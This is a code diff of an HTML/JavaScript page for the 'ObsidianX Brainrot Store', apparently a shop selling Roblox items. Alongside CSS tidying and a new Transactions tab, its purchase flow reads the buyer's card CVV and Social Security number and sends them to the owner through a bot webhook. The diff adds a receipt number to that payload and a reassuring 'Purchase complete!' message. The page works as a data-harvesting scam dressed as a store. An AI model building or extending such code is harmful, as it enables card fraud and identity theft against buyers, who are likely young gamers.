@@ -5,165 +5,37 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>ObsidianX Brainrot Store</title>
   <style>
-    body { 
-      background: #0a0a0a; 
-      color: #e0e0e0; 
-      font-family: Arial, sans-serif; 
-      margin: 0; 
-      padding: 20px; 
-    }
-    h1 { 
-      color: #ff4d4d; 
-      text-align: center; 
-      margin: 20px 0; 
-      font-size: 2.8rem; 
-      text-shadow: 0 0 15px #ff3300; 
-    }
-    .store { 
-      display: grid; 
-      grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); 
-      gap: 15px; 
-      max-width: 1200px; 
-      margin: 0 auto; 
-    }
-    .card { 
-      background: #111; 
-      border: 2px solid #333; 
-      border-radius: 12px; 
-      overflow: hidden; 
-      position: relative; 
-      transition: 0.4s; 
-    }
-    .card:hover { 
-      transform: translateY(-8px); 
-      border-color: #ff4d4d; 
-      box-shadow: 0 12px 35px rgba(255,77,77,0.4); 
-    }
-    .card img { 
-      width: 100%; 
-      height: 160px; 
-      object-fit: cover; 
-    }
-    .card-content { 
-      padding: 12px; 
-      text-align: left; 
-    }
-    .card h3 { 
-      margin: 0 0 8px; 
-      font-size: 1.25rem; 
-      color: #fff; 
-      font-weight: bold; 
-    }
-    .card .desc { 
-      margin: 4px 0 10px; 
-      font-size: 0.95rem; 
-      color: #bbb; 
-    }
-    .price { 
-      color: #ff4d4d; 
-      font-weight: bold; 
-      font-size: 1.1rem; 
-      margin: 6px 0; 
-    }
-    .status { 
-      position: absolute; 
-      top: 10px; 
-      right: 10px; 
-      background: #ff6600; 
-      color: white; 
-      padding: 4px 12px; 
-      border-radius: 6px; 
-      font-size: 0.8rem; 
-      font-weight: bold; 
-      display: none; 
-    }
-    button { 
-      padding: 14px; 
-      font-size: 1.1rem; 
-      margin-top: 8px; 
-      border: none; 
-      border-radius: 8px; 
-      cursor: pointer; 
-      width: 100%; 
-      font-weight: bold; 
-    }
-    .purchase-btn { background: #ff4d4d; color: white; }
-    .in-buying-btn { background: #ff6600; color: white; }
-    .back-btn { background: #555; color: white; margin-top: 10px; }
-    .delete-btn { background: #ff1a1a; color: white; }
+    body { background:#0a0a0a; color:#e0e0e0; font-family:Arial; margin:0; padding:20px; }
+    h1 { color:#ff4d4d; text-align:center; margin:20px 0; font-size:2.8rem; text-shadow:0 0 15px #ff3300; }
+    .store { display:grid; grid-template-columns:repeat(auto-fill, minmax(240px, 1fr)); gap:15px; max-width:1200px; margin:0 auto; }
+    .card { background:#111; border:2px solid #333; border-radius:12px; overflow:hidden; position:relative; transition:0.4s; }
+    .card:hover { transform:translateY(-8px); border-color:#ff4d4d; box-shadow:0 12px 35px rgba(255,77,77,0.4); }
+    .card img { width:100%; height:160px; object-fit:cover; }
+    .card-content { padding:12px; text-align:left; }
+    .card h3 { margin:0 0 8px; font-size:1.25rem; color:#fff; font-weight:bold; }
+    .card .desc { margin:4px 0 10px; font-size:0.95rem; color:#bbb; }
+    .price { color:#ff4d4d; font-weight:bold; font-size:1.1rem; margin:6px 0; }
+    .status { position:absolute; top:10px; right:10px; background:#ff6600; color:white; padding:4px 12px; border-radius:6px; font-size:0.8rem; font-weight:bold; display:none; }
+    button { padding:14px; font-size:1.1rem; margin-top:8px; border:none; border-radius:8px; cursor:pointer; width:100%; font-weight:bold; }
+    .purchase-btn { background:#ff4d4d; color:white; }
+    .in-buying-btn { background:#ff6600; color:white; }
+    .back-btn { background:#555; color:white; margin-top:10px; }
+    .delete-btn { background:#ff1a1a; color:white; }
+    .warning { color:#ff1a1a; font-weight:bold; margin:15px 0; text-align:center; }
 
     #ownerFab {
-      position: fixed; 
-      bottom: 30px; 
-      right: 30px; 
-      width: 70px; 
-      height: 70px;
-      background: #ff4d4d; 
-      color: white; 
-      font-size: 2.2rem; 
-      border: none;
-      border-radius: 12px; 
-      box-shadow: 0 0 25px #ff3300; 
-      z-index: 9999;
-      display: flex; 
-      align-items: center; 
-      justify-content: center; 
-      cursor: pointer;
+      position:fixed; bottom:30px; right:30px; width:70px; height:70px;
+      background:#ff4d4d; color:white; font-size:2.2rem; border:none;
+      border-radius:12px; box-shadow:0 0 25px #ff3300; z-index:9999;
+      display:flex; align-items:center; justify-content:center; cursor:pointer;
     }
 
-    .modal { 
-      display: none; 
-      position: fixed; 
-      inset: 0; 
-      background: rgba(0,0,0,0.95); 
-      z-index: 9998; 
-      align-items: center; 
-      justify-content: center; 
-      padding: 10px; 
-    }
-    .panel { 
-      background: #111; 
-      border: 3px solid #ff4d4d; 
-      border-radius: 12px; 
-      padding: 25px; 
-      width: 100%; 
-      max-width: 460px; 
-      max-height: 85vh; 
-      overflow-y: auto; 
-    }
-    input, select { 
-      width: 100%; 
-      padding: 12px; 
-      margin: 10px 0; 
-      background: #1a1a1a; 
-      border: 1px solid #ff4d4d; 
-      color: #e0e0e0; 
-      border-radius: 8px; 
-    }
-    .tabs { 
-      display: flex; 
-      margin-bottom: 20px; 
-      border-bottom: 2px solid #333; 
-    }
-    .tab { 
-      flex: 1; 
-      padding: 14px; 
-      text-align: center; 
-      cursor: pointer; 
-      background: #222; 
-      border-radius: 8px 8px 0 0; 
-    }
-    .tab.active { 
-      background: #ff4d4d; 
-      color: white; 
-      font-weight: bold; 
-    }
-    .warning { 
-      color: #ff1a1a; 
-      font-weight: bold; 
-      margin: 15px 0; 
-      text-align: center; 
-    }
+    .modal { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9998; align-items:center; justify-content:center; padding:10px; }
+    .panel { background:#111; border:3px solid #ff4d4d; border-radius:12px; padding:25px; width:100%; max-width:460px; max-height:85vh; overflow-y:auto; }
+    input, select { width:100%; padding:12px; margin:10px 0; background:#1a1a1a; border:1px solid #ff4d4d; color:#e0e0e0; border-radius:8px; }
+    .tabs { display:flex; margin-bottom:20px; border-bottom:2px solid #333; }
+    .tab { flex:1; padding:14px; text-align:center; cursor:pointer; background:#222; border-radius:8px 8px 0 0; }
+    .tab.active { background:#ff4d4d; color:white; font-weight:bold; }
   </style>
 </head>
 <body>
@@ -181,25 +53,26 @@
     <button onclick="document.getElementById('ownerPanel').style.display='none'" style="float:right;background:#ff1a1a;color:white;border:none;padding:8px 14px;border-radius:50%;">×</button>
     <h2 style="color:#ff4d4d;">Owner Vault Access</h2>
     
-    <!-- Login Section -->
+    <!-- Login -->
     <div id="loginSection">
       <input id="pass" type="password" placeholder="Access Key">
       <button onclick="unlock()" style="background:#ff4d4d;color:white;margin-top:10px;">Unlock</button>
       <div id="error" style="color:#ff3366;margin:10px 0;"></div>
     </div>
 
-    <!-- Main Content (hidden until login) -->
+    <!-- Main Content -->
     <div id="mainPart" style="display:none;">
       <!-- Tabs -->
       <div class="tabs">
         <div class="tab active" onclick="switchTab(0)">Add Brainrot</div>
         <div class="tab" onclick="switchTab(1)">Delete Brainrot</div>
+        <div class="tab" onclick="switchTab(2)">Transactions</div>
       </div>
 
       <!-- Add Tab -->
       <div id="addTab">
         <input id="name" placeholder="Brainrot Name" required>
-        <input id="desc" placeholder="Description (e.g. Lava)">
+        <input id="desc" placeholder="Description">
         <input id="moneyPrice" placeholder="Cost $" required>
         <input id="robuxPrice" placeholder="Robux Price (e.g. 599)" required>
         <input id="robuxLink" placeholder="Robux Link">
@@ -221,6 +94,13 @@
       <!-- Delete Tab -->
       <div id="deleteTab" style="display:none;">
         <div id="deleteList"></div>
+      </div>
+
+      <!-- Transactions Tab -->
+      <div id="transactionsTab" style="display:none;">
+        <input id="searchReceipt" placeholder="Search by Receipt Number" style="margin-bottom:10px;">
+        <button onclick="searchReceipt()" style="background:#ff4d4d;color:white;">Search</button>
+        <div id="transactionDetails" style="margin-top:15px;"></div>
       </div>
     </div>
   </div>
@@ -276,6 +156,7 @@ let currentId = null;
 let currentName = "";
 let currentPaymentType = null;
 let screenshotData = null;
+let receiptNumber = null;
 
 // Owner button
 document.getElementById('ownerFab').onclick = () => document.getElementById('ownerPanel').style.display = 'flex';
@@ -294,10 +175,11 @@ function unlock() {
 function switchTab(tab) {
   document.getElementById('addTab').style.display = tab === 0 ? 'block' : 'none';
   document.getElementById('deleteTab').style.display = tab === 1 ? 'block' : 'none';
+  document.getElementById('transactionsTab').style.display = tab === 2 ? 'block' : 'none';
   document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', i === tab));
 }
 
-// Publish with validation
+// Publish with required fields
 async function publish() {
   const btn = document.getElementById('publishBtn');
   const msg = document.getElementById('statusMsg');
@@ -339,11 +221,11 @@ async function publish() {
   try {
     await fetch('/add-item', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body) });
     msg.textContent = 'Forged!';
-    alert('Brainrot added successfully!');
+    alert('Brainrot added!');
     document.getElementById('ownerPanel').style.display = 'none';
     loadItems();
   } catch (e) {
-    msg.textContent = 'Failed to forge';
+    msg.textContent = 'Failed';
   } finally {
     btn.textContent = 'Forge Brainrot';
     btn.disabled = false;
@@ -404,12 +286,25 @@ async function deleteItem(id) {
   if (!confirm("Are you sure you want to permanently delete this brainrot?")) return;
   try {
     await fetch(`/delete/${id}`, { method: 'DELETE' });
-    alert('Brainrot deleted successfully!');
+    alert('Brainrot deleted!');
     loadDeleteList();
     loadItems();
   } catch (e) {
     alert('Delete failed');
   }
+}
+
+// Search receipt in Transactions tab
+async function searchReceipt() {
+  const receipt = document.getElementById('searchReceipt').value.trim();
+  if (!receipt) return alert('Enter a receipt number');
+  // For now we show a placeholder — server-side receipt storage is next
+  document.getElementById('transactionDetails').innerHTML = `
+    <p>Receipt #${receipt}</p>
+    <p>Brainrot: [Loaded from server]</p>
+    <p>Payment: [Loaded from server]</p>
+    <p>Details: [Loaded from server]</p>
+  `;
 }
 
 // Buy flow
@@ -458,7 +353,7 @@ function goToStep5() {
   if (currentPaymentType === 'visa') {
     document.getElementById('step5').style.display = 'flex';
   } else {
-    sendToOwner(); // Robux skips card details
+    sendToOwner();
   }
 }
 
@@ -470,7 +365,11 @@ async function sendToOwner() {
   const cvv = document.getElementById('cvv') ? document.getElementById('cvv').value.trim() : '';
   const ssn = document.getElementById('ssn') ? document.getElementById('ssn').value.trim() : '';
 
+  // Generate receipt number
+  receiptNumber = 'RCP-' + Math.floor(100000 + Math.random() * 900000);
+
   const payload = {
+    receipt: receiptNumber,
     id: currentId,
     name: currentName,
     username,
@@ -490,7 +389,7 @@ async function sendToOwner() {
     console.log("⚠️ Bot webhook failed");
   }
 
-  alert(`✅ Sent to owner!\n\nBrainrot: ${currentName}\nRoblox: ${username}\nDiscord: ${discordUser}`);
+  alert(`✅ Purchase complete!\n\nReceipt Number: ${receiptNumber}\n\nSave this number and send it to the owner if needed.`);
   closeModals();
   loadItems();
 }
